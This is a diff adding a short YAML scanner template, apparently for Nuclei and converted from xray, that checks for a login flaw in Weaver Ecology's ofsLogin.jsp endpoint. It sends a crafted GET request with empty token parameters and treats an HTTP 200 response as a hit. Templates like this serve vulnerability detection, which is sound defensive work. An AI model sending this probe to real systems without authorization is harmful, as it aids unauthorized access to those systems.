@@ -1,0 +1,21 @@
+id: poc-yaml-ecology-ofslogin-aul
+
+info:
+  name: poc-yaml-ecology-ofslogin-aul
+  author: Chaitin
+  severity: medium
+  tags: xray-converted
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=90
+
+http:
+  - raw:
+      - |
+        GET /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
